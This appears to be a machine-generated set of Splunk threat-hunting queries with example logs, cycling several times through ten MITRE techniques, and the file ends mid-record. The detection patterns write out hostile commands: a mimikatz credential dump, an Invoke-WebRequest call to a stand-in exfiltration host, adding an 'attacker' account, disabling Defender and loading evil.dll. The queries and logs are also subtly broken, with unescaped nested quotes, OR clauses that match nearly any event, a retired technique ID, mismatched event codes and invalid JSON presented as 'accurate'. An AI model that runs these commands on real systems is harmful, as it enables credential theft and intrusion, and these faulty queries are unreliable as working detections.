# Splunk Threat Hunting Queries


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:00:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "22"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:05:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.146",
  "DestinationPort": "3389"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:10:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.126",
  "DestinationPort": "443"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 3"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:15:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 3",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.102",
  "DestinationPort": "8443"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:20:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.139",
  "DestinationPort": "8443"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:25:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.128",
  "DestinationPort": "80"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:30:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.114",
  "DestinationPort": "22"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:35:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.113",
  "DestinationPort": "8080"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:40:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "445"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:45:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.107",
  "DestinationPort": "80"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:50:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.121",
  "DestinationPort": "8080"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 14:55:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.126",
  "DestinationPort": "3389"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:00:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.147",
  "DestinationPort": "80"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 13"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:05:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 13",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.141",
  "DestinationPort": "8080"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:10:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.108",
  "DestinationPort": "8080"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:15:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.148",
  "DestinationPort": "443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:20:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.116",
  "DestinationPort": "8443"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:25:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "80"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:30:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "3389"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:35:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "80"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:40:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.118",
  "DestinationPort": "22"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:45:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.110",
  "DestinationPort": "8443"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="testuser"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:50:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "testuser",
  "Source_Network_Address": "192.168.56.103",
  "DestinationPort": "3389"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 23"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 15:55:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 23",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.100",
  "DestinationPort": "445"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:00:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.131",
  "DestinationPort": "8080"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:05:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.136",
  "DestinationPort": "80"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:10:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.124",
  "DestinationPort": "443"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:15:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.144",
  "DestinationPort": "445"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:20:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.105",
  "DestinationPort": "8080"
}
```

---


## T1140 - Detection of Encoded Payload via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell -enc SQBFAFgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:25:00",
  "MITRE_Technique": "T1140",
  "Description": "Detection of Encoded Payload via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell -enc SQBFAFgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.147",
  "DestinationPort": "3389"
}
```

---


## T1003.001 - Detection of Credential Dumping via mimikatz.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine=".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords""
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:30:00",
  "MITRE_Technique": "T1003.001",
  "Description": "Detection of Credential Dumping via mimikatz.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": ".\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.141",
  "DestinationPort": "22"
}
```

---


## T1059.001 - Detection of Obfuscated PowerShell via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="4104" CommandLine="powershell.exe -EncodedCommand aQBlAHgA"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:35:00",
  "MITRE_Technique": "T1059.001",
  "Description": "Detection of Obfuscated PowerShell via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "4104",
  "CommandLine": "powershell.exe -EncodedCommand aQBlAHgA",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.138",
  "DestinationPort": "8080"
}
```

---


## T1071.001 - Detection of HTTP Communication via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode="3" CommandLine="Invoke-WebRequest -Uri http://malicious.site/exfil"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="svc-account"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:40:00",
  "MITRE_Technique": "T1071.001",
  "Description": "Detection of HTTP Communication via powershell.exe",
  "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
  "EventCode": "3",
  "CommandLine": "Invoke-WebRequest -Uri http://malicious.site/exfil",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "svc-account",
  "Source_Network_Address": "192.168.56.136",
  "DestinationPort": "445"
}
```

---


## T1021.001 - Detection of RDP Brute Force via mstsc.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4625" CommandLine="mstsc.exe /v:192.168.56.102 -session 33"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:45:00",
  "MITRE_Technique": "T1021.001",
  "Description": "Detection of RDP Brute Force via mstsc.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4625",
  "CommandLine": "mstsc.exe /v:192.168.56.102 -session 33",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.123",
  "DestinationPort": "3389"
}
```

---


## T1086 - Detection of CMD Execution via cmd.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="net user attacker P@ssw0rd! /add"
OR ParentProcessName="C:\Windows\System32\explorer.exe"
OR User="SYSTEM"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:50:00",
  "MITRE_Technique": "T1086",
  "Description": "Detection of CMD Execution via cmd.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "net user attacker P@ssw0rd! /add",
  "ParentProcessName": "C:\Windows\System32\explorer.exe",
  "User": "SYSTEM",
  "Source_Network_Address": "192.168.56.119",
  "DestinationPort": "445"
}
```

---


## T1055.001 - Detection of DLL Injection via rundll32.exe

### Splunk Query

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode="10" CommandLine="rundll32.exe C:\evil.dll,EntryPoint"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="jdoe"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 16:55:00",
  "MITRE_Technique": "T1055.001",
  "Description": "Detection of DLL Injection via rundll32.exe",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "EventCode": "10",
  "CommandLine": "rundll32.exe C:\evil.dll,EntryPoint",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "jdoe",
  "Source_Network_Address": "192.168.56.130",
  "DestinationPort": "8443"
}
```

---


## T1036.005 - Detection of Masquerading via svchost.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="ren notepad.exe svchost.exe"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:00:00",
  "MITRE_Technique": "T1036.005",
  "Description": "Detection of Masquerading via svchost.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "ren notepad.exe svchost.exe",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.121",
  "DestinationPort": "443"
}
```

---


## T1005 - Detection of Data Collection via robocopy.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4663" CommandLine="robocopy C:\sensitive D:\staged /E"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:05:00",
  "MITRE_Technique": "T1005",
  "Description": "Detection of Data Collection via robocopy.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4663",
  "CommandLine": "robocopy C:\sensitive D:\staged /E",
  "ParentProcessName": "C:\Windows\System32\cmd.exe",
  "User": "Administrator",
  "Source_Network_Address": "192.168.56.111",
  "DestinationPort": "3389"
}
```

---


## T1562.001 - Detection of Disable Defender via powershell.exe

### Splunk Query

```spl
index=windows sourcetype="WinEventLog:Security" EventCode="4688" CommandLine="Set-MpPreference -DisableRealtimeMonitoring $true"
OR ParentProcessName="C:\Windows\System32\cmd.exe"
OR User="Administrator"
```
### Accurate Result Data (Example Log)

```json
{
  "timestamp": "2024-05-28 17:10:00",
  "MITRE_Technique": "T1562.001",
  "Description": "Detection of Disable Defender via powershell.exe",
  "sourcetype": "WinEventLog:Security",
  "EventCode": "4688",
  "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring $true",
